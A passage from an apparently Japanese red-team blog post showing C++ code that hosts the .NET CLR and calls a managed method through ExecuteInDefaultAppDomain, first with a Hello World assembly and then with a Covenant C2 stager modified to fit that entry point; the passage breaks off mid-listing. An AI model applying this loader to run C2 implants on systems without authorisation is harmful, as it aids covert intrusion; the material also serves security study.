&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwzMethodName&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwzArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;例として「Hello, World!」を出力する .NET プログラムを作成します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Windows.Forms&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;hello&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Program&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Say&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;MessageBox&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Hello, World!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HostingSay&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwzArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Say&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Say&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ExecuteInDefaultAppDomain() の要求に一致させるため、HostingSay() を実装しています。&lt;br&gt;
コンパイルし、hello.exeを生成します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bat&#34; data-lang=&#34;bat&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe hello.cs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;このアセンブリを呼び出す C++ コードが以下です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;mscoree.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;corerror.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;metahost.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;#34;callnet.h&amp;#34;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#pragma comment (lib, &amp;#34;mscoree.lib&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#import &amp;#34;mscorlib.tlb&amp;#34; raw_interfaces_only high_property_prefixes(&amp;#34;_get&amp;#34;,&amp;#34;_put&amp;#34;,&amp;#34;_putref&amp;#34;) rename(&amp;#34;ReportEvent&amp;#34;,&amp;#34;InteropServices_ReportEvent&amp;#34;) rename(&amp;#34;or&amp;#34;,&amp;#34;oref&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;wmain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;wchar_t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HRESULT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ICLRMetaHost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pMetaHost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ICLRRuntimeInfo&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pRuntimeInfo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ICLRRuntimeHost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pClrRuntimeHost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;TCHAR&lt;/span&gt;           &lt;span class=&#34;n&#34;&gt;szBuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// build runtime
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;hr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CLRCreateInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CLSID_CLRMetaHost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IID_PPV_ARGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pMetaHost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;hr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pMetaHost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetRuntime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;v4.0.30319&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IID_PPV_ARGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pRuntimeInfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;hr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pRuntimeInfo&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetInterface&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CLSID_CLRRuntimeHost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;IID_PPV_ARGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pClrRuntimeHost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// start runtime
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;hr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pClrRuntimeHost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// execute managed assembly
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pReturnValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;hr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pClrRuntimeHost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ExecuteInDefaultAppDomain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hello.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hello.Program&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;HostingSay&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pReturnValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ExecuteInDefaultAppDomain HRESULT: %x &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//pause
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// free resources
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;pMetaHost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;pRuntimeInfo&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;pClrRuntimeHost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;これもコンパイルして、同じフォルダにhello.exeを置いた状態で実行してみます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/callnet_test.png&#34; alt=&#34;callnet_test&#34;&gt;
&lt;/p&gt;
&lt;p&gt;.NET アセンブリであるhello.exeのSay()で記述されているメッセージボックスが表示されました。ProcessHackerで該当プロセスを確認すると .NET assembliesタブがあり、そこにDefaultDomainという名前のAppDomainが存在します。&lt;/p&gt;
&lt;h3 id=&#34;covenant-stagerを呼び出してみる&#34;&gt;Covenant Stagerを呼び出してみる&lt;/h3&gt;
&lt;p&gt;CLR を呼び出すことを確認できたので、次はCovenant Stagerを呼び出してみます。&lt;/p&gt;
&lt;p&gt;ExecuteInDefaultAppDomain()の要求に一致させるため、Stagerのコードなら以下のようにExecute()を呼び出すメソッドを追加する必要があります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HostingExecute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwzArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Execute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Covenant にはStagerおよび最終的なペイロードであるExecutorをテンプレートで変更できるTemplates画面があります。そこの画面で追加しましょう。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/template_appdomain.png&#34; alt=&#34;template_appdomain&#34;&gt;
&lt;/p&gt;
&lt;p&gt;新しいBinary Launcherをダウンロードし、これをExecuteInDefaultAppDomain()で呼んでみましょう。ローダーの差分のコードです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(..&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;snip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..)&lt;/span&gt;
